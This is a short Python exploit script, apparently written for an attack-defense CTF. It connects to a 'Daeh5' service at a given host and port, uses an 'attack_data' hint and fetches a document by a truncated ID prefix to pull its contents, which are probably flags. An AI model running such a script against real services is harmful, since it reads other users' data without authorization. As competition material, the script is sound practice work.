#!/usr/bin/env python3

from pathlib import Path

import sys

sys.path.insert(0, str(Path(__file__).absolute().parent / 'proto'))

from daeh5 import Daeh5

if len(sys.argv) < 3:
    print(f'Usage: {sys.argv[0]} <HOST:PORT> <attack_data>')
    sys.exit(1)

url = sys.argv[1]
hint = sys.argv[2]

d = Daeh5(url)
d.ping()
with d.session() as session:
    # [:6] would work too.
    doc = session.get_document(hint[:9])

print(doc, flush=True)
